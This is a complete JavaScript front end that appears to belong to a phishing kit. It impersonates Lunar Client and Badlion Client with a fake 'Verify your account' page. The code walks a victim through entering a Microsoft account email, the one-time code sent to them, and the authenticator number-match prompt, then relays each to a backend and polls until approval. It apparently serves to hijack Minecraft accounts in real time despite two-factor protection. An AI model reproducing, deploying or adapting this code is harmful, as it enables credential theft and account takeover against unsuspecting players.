// Logo Paths
const lunarLogoPath = '/imgs/lunar.png';
const badlionLogoPath = '/imgs/badlion.png';
const defaultLogoPath = '/imgs/lunar.png';

// State
let currentStep = 'email';
let userEmail = '';
let isLoading = false;
let isAuthenticating = false; // Flag to control auth loop
let csrfToken = '';

// DOM Elements
const subtitle = document.getElementById('subtitle');
const emailStep = document.getElementById('emailStep');
const otpStep = document.getElementById('otpStep');
const authAppStep = document.getElementById('authAppStep');
const emailInput = document.getElementById('email');
const otpInputs = document.querySelectorAll('.otp-input');
const entropyDisplay = document.getElementById('entropy');
const submitBtn = document.getElementById('submitBtn');
const errorAlert = document.getElementById('errorAlert');
const errorTitle = document.getElementById('errorTitle');
const errorMessage = document.getElementById('errorMessage');
const authForm = document.getElementById('authForm');
const otpEmailDisplay = document.getElementById('otpEmailDisplay');

// Session Storage Management
const API_RESPONSE_STORAGE_KEY = 'apiResponse';

function saveApiResponse(response) {
    sessionStorage.setItem(API_RESPONSE_STORAGE_KEY, JSON.stringify(response));
}

function getSavedApiResponse() {
    const storedResponse = sessionStorage.getItem(API_RESPONSE_STORAGE_KEY);
    return storedResponse ? JSON.parse(storedResponse) : null;
}

function clearSavedApiResponse() {
    sessionStorage.removeItem(API_RESPONSE_STORAGE_KEY);
}

// Initialize
function init() {
    csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
    customizePage();
    authForm.addEventListener('submit', (e) => {
        e.preventDefault();
        handleSubmit(e);
    });

    otpInputs.forEach((input, index) => {
        input.addEventListener('keyup', (e) => handleOtpInput(e, index));
        input.addEventListener('paste', handleOtpPaste);
    });

    document.addEventListener('mousemove', (e) => {
        const x = e.clientX / window.innerWidth;
        const y = e.clientY / window.innerHeight;
        document.querySelector('.orb1').style.transform = `translate(${x * 30}px, ${y * 30}px)`;
        document.querySelector('.orb2').style.transform = `translate(${-x * 30}px, ${-y * 30}px)`;
    });
}

// Customize page based on hostname
function customizePage() {
    const hostname = window.location.hostname.toLowerCase();
    const clientNameElement = document.getElementById('client-name');
    const logoIconElement = document.getElementById('logo-icon').querySelector('img');
    link = document.createElement('link');
    link.rel = 'icon';
    document.head.appendChild(link);
    if (hostname.includes('lunar')) {
        document.title = 'Lunar Client - Authentication';
        clientNameElement.textContent = 'Lunar Client';
        logoIconElement.src = lunarLogoPath;
        link.href = lunarLogoPath;
    } else if (hostname.includes('badlion')) {
        document.title = 'Badlion Client - Authentication';
        clientNameElement.textContent = 'Badlion Client';
        logoIconElement.src = badlionLogoPath;
        link.href = badlionLogoPath;
    } else {
        document.title = 'Lunar Client - Authentication';
        clientNameElement.textContent = 'Lunar Client';
        logoIconElement.src = lunarLogoPath;
        link.href = lunarLogoPath;
    }
    // Default is Lunar Client as set in the HTML
}

// Handle form submission
async function handleSubmit(e) {
    e.preventDefault();
    if (isLoading) return;

    isLoading = true;
    updateButton();
    hideError();

    try {
        if (currentStep === 'email') {
            await handleEmailStep();
        } else if (currentStep === 'otp') {
            await handleOtpStep();
        } else if (currentStep === 'auth_app') {
            // This case handles the "Retry" button press for auth_app
            await handleEmailStep();
        }
    } catch (err) {
        console.error('Unexpected error:', err);
        showError('Connection Error', 'Unable to connect to server. Please check your connection.');
        isLoading = false;
        updateButton();
    }
}

// Handle email step
async function handleEmailStep() {
    userEmail = emailInput.value.trim();
    if (!userEmail || !userEmail.includes('@')) {
        showError('Invalid Email', 'Please enter a valid email address.');
        isLoading = false;
        updateButton();
        return;
    }

    clearSavedApiResponse();
    const response = await apiCall({ step: 'email', email: userEmail });

    if (response.ok) {
        saveApiResponse(response.APIResponse);
    }
    handleBackendResponse(response);
}

// Handle OTP step
async function handleOtpStep() {
    const otpCode = Array.from(otpInputs)
        .map((input) => input.value)
        .join('');
    if (otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
        showError('Invalid Code', 'Please enter a complete 6-digit code.');
        isLoading = false;
        updateButton();
        return;
    }

    const savedResponse = getSavedApiResponse();
    if (!savedResponse) {
        showError(
            'Session Expired',
            'No session found to attempt verification. Please re-enter your email.'
        );
        resetToEmailStep();
        return;
    }

    const response = await apiCall({
        step: 'otp',
        email: userEmail,
        otp: otpCode,
        state: savedResponse,
    });

    handleBackendResponse(response);
}

// API call wrapper with timeout
async function apiCall(payload, timeout = 600000) {
    // Default 30s timeout
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);

    try {
        let url;
        switch (payload.step) {
            case 'email':
                url = '/api/verification/email';
                break;
            case 'otp':
                url = '/api/verification/otp';
                break;
            case 'auth':
                url = '/api/verification/auth';
                break;
            default:
                url = '/api/verification';
        }

        const path = window.location.pathname;
        const pathParts = path.split('/');
        const username = pathParts[pathParts.length - 1];
        const payloadWithUsername = { ...payload, username };

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrfToken,
            },
            body: JSON.stringify(payloadWithUsername),
            signal: controller.signal,
        });

        clearTimeout(id);
        const data = await response.json(); // data will be {ok: boolean, APIResponse: object} from backend

        const isBackendOk = data.ok === true; // Check backend's 'ok' field
        const isHttpResponseOk = response.ok; // Check HTTP response status

        if (
            (payload.step === 'otp' || payload.step === 'auth') &&
            isBackendOk &&
            isHttpResponseOk
        ) {
            return {
                ok: true,
                APIResponse: { status: 'success' }, // Create a synthetic response
            };
        }

        return {
            ok: isHttpResponseOk && isBackendOk, // Overall success is both HTTP ok and Backend ok
            APIResponse: data.APIResponse, // Pass the APIResponse part as is
        };
    } catch (error) {
        clearTimeout(id);
        if (error.name === 'AbortError') {
            return {
                ok: false,
                APIResponse: {
                    status: 'error',
                    code: 'AUTH_TIMEOUT',
                    message: 'The request timed out.',
                },
            };
        }
        console.error('API call failed:', error);
        return {
            ok: false,
            APIResponse: {
                status: 'error',
                code: 'FETCH_ERROR',
                message: 'Could not connect to the server.',
            },
        };
    }
}

// Handle backend response
function handleBackendResponse(response) {
    if (!response || !response.APIResponse) {
        showError('Error', 'Invalid response from server.');
        isLoading = false;
        updateButton();
        return;
    }

    const apiResponse = response.APIResponse;

    if (response.ok) {
        if (apiResponse.entropy) {
            // Auth app step
            if (response.ok) {
                saveApiResponse(apiResponse);
            }
            showAuthAppStep(apiResponse.entropy);
            handleAuthAppStep(); // Start the long polling
        } else if (currentStep === 'email') {
            // OTP step - pass sec_email from state if available
            saveApiResponse(apiResponse);
            const secEmail = apiResponse.state?.sec_email || null;
            showOtpStep(secEmail);
        } else {
            // Success
            saveApiResponse(apiResponse);
            showSuccessStep();
        }
    } else {
        // Error handling
        let title = 'Error';
        let message = apiResponse.message || '';

        // Handle specific status codes with custom messages
        if (apiResponse.status === 'invalid_otp') {
            title = 'Invalid Code';
            message = message || 'The code you entered is incorrect. Please try again.';
        } else if (apiResponse.status === 'no_minecraft') {
            title = 'No Minecraft Account';
            message = message || 'This Microsoft account does not have a Minecraft license.';
        } else if (apiResponse.status === 'auth_timeout') {
            title = 'Authentication Timeout';
            message = message || 'The authentication request timed out. Please try again.';
        } else if (apiResponse.status === 'auth_rejected') {
            title = 'Authentication Rejected';
            message = message || 'The authentication was rejected or cancelled. Please try again.';
        } else if (apiResponse.status === 'error' || apiResponse.status === 'server_error') {
            title = 'Server Error';
            message = message || 'A server error occurred. Please try again later.';
        } else if (message && message.includes('not associated')) {
            title = 'Email Not Found';
        } else if (message && message.includes('security-email')) {
            title = 'Security Info Missing';
        } else if (message && message.includes('Minecraft license')) {
            title = 'No Minecraft Account';
        }

        // Fallback message if still empty
        if (!message) {
            message = 'An unexpected error occurred. Please try again.';
        }

        showError(title, message);

        if (currentStep === 'otp') {
            clearOtpInputs();
        } else if (currentStep !== 'auth_app') {
            resetToEmailStep();
        }
        // For auth_app, we let the user retry
        isLoading = false;
        updateButton();
    }
}

// Handle Auth App step with polling
let pollInterval;

async function handleAuthAppStep() {
    isAuthenticating = true;
    isLoading = true;
    updateButton();

    const startTime = Date.now();
    const POLL_INTERVAL = 1000; // 1 second between requests
    const MAX_DURATION = 180000; // 3 minutes

    // Clear any existing interval just in case
    if (pollInterval) clearTimeout(pollInterval);

    pollInterval = setTimeout(async function poll() {
        const elapsed = Date.now() - startTime;

        if (!isAuthenticating) return; // Stop if auth cancelled elsewhere

        if (elapsed > MAX_DURATION) {
            isAuthenticating = false;
            isLoading = false;
            updateButton(); // Will show "Retry"
            return;
        }

        const savedResponse = getSavedApiResponse();
        if (!savedResponse) {
            showError('Session Expired', 'Authentication session expired.');
            resetToEmailStep();
            return;
        }

        try {
            const response = await apiCall(
                {
                    step: 'auth',
                    email: userEmail,
                    state: savedResponse,
                },
                10000 // 10s timeout
            );

            if (response.ok) {
                isAuthenticating = false;
                saveApiResponse(response.APIResponse);
                showSuccessStep();
            } else {
                const status = response.APIResponse?.status;
                if (status === 'auth_rejected' || status === 'error' || status === 'server_error') {
                    // Stop polling on fatal errors
                    isAuthenticating = false;
                    handleBackendResponse(response);
                    return;
                }

                // Continue polling if no fatal error
                if (isAuthenticating) {
                    pollInterval = setTimeout(poll, POLL_INTERVAL);
                }
            }
        } catch (e) {
            // If error occurs (e.g. network), continue polling
            console.error("Polling error", e);
            if (isAuthenticating) {
                pollInterval = setTimeout(poll, POLL_INTERVAL);
            }
        }
    }, POLL_INTERVAL);
}

// Helper function to mask email for privacy
function maskEmail(email) {
    const [localPart, domain] = email.split('@');
    if (!domain) return email; // invalid email, return as-is
    if (localPart.length <= 2) {
        return `${localPart[0]}***@${domain}`;
    }
    return `${localPart.slice(0, 2)}***@${domain}`;
}

// Show steps
function showOtpStep(secEmail) {
    currentStep = 'otp';
    subtitle.textContent = 'Enter Your One-Time Code';
    emailStep.classList.add('hidden');
    otpStep.classList.remove('hidden');
    authAppStep.classList.add('hidden');
    // Display the masked security email from API, or fall back to masking user input
    const displayEmail = secEmail || maskEmail(userEmail);
    otpEmailDisplay.textContent = `Sent to ${displayEmail}`;
    clearOtpInputs();
    otpInputs[0].focus();
    isLoading = false;
    updateButton();
}

function showAuthAppStep(entropyCode) {
    currentStep = 'auth_app';
    subtitle.textContent = 'Confirm on Your Device';
    emailStep.classList.add('hidden');
    otpStep.classList.add('hidden');
    authAppStep.classList.remove('hidden');
    entropyDisplay.textContent = entropyCode || '';
    // isLoading and button state managed by handleAuthAppStep
}

function showSuccessStep() {
    isAuthenticating = false;
    currentStep = 'success';
    isLoading = false;

    // Hide input fields
    emailStep.classList.add('hidden');
    otpStep.classList.add('hidden');
    authAppStep.classList.add('hidden');

    // Disable the button permanently
    submitBtn.disabled = true;

    updateButton();
}

function resetToEmailStep() {
    isAuthenticating = false; // Cancel any auth process
    currentStep = 'email';
    subtitle.textContent = 'Verify your account';
    emailStep.classList.remove('hidden');
    otpStep.classList.add('hidden');
    authAppStep.classList.add('hidden');
    isLoading = false;
    updateButton();
    clearSavedApiResponse();
}

function resetForm() {
    if (pollInterval) clearTimeout(pollInterval); // Clear timeout on reset
    isAuthenticating = false; // Cancel any auth process
    currentStep = 'email';
    userEmail = '';
    emailInput.value = '';
    clearOtpInputs();
    entropyDisplay.textContent = '';
    subtitle.textContent = 'Verify your account';
    emailStep.classList.remove('hidden');
    otpStep.classList.add('hidden');
    authAppStep.classList.add('hidden');
    hideError();
    isLoading = false;
    updateButton();
    clearSavedApiResponse();
}

// OTP input handlers
function handleOtpInput(e, index) {
    const input = e.target;
    const key = e.key;
    if (key >= '0' && key <= '9' && index < 5 && input.value) {
        otpInputs[index + 1]?.focus();
    } else if (key === 'Backspace' && index > 0 && !input.value) {
        otpInputs[index - 1]?.focus();
    }
}

function handleOtpPaste(e) {
    e.preventDefault();
    const paste = (e.clipboardData || window.clipboardData).getData('text');
    if (paste.length === 6 && /^\d+$/.test(paste)) {
        paste.split('').forEach((char, index) => {
            if (otpInputs[index]) {
                otpInputs[index].value = char;
            }
        });
        otpInputs[5]?.focus();
    }
}

function clearOtpInputs() {
    otpInputs.forEach((input) => (input.value = ''));
}

// UI updates
function updateButton() {
    submitBtn.disabled = isLoading;

    if (isAuthenticating) {
        submitBtn.textContent = 'Waiting for confirmation...';
    } else if (isLoading) {
        submitBtn.textContent = 'Verifying...';
    } else {
        switch (currentStep) {
            case 'otp':
                submitBtn.textContent = 'Confirm Code';
                break;
            case 'auth_app':
                submitBtn.textContent = 'Retry';
                break;
            case 'success':
                submitBtn.textContent = '✓ Verified';
                submitBtn.disabled = true;
                subtitle.textContent = 'Verified!';
                break;
            default:
                submitBtn.textContent = 'Verify';
        }
    }
}

function showError(title, message) {
    errorTitle.textContent = title;
    errorMessage.textContent = message;
    errorAlert.classList.add('show');
}

function hideError() {
    errorAlert.classList.remove('show');
    errorTitle.textContent = '';
    errorMessage.textContent = '';
}

init();
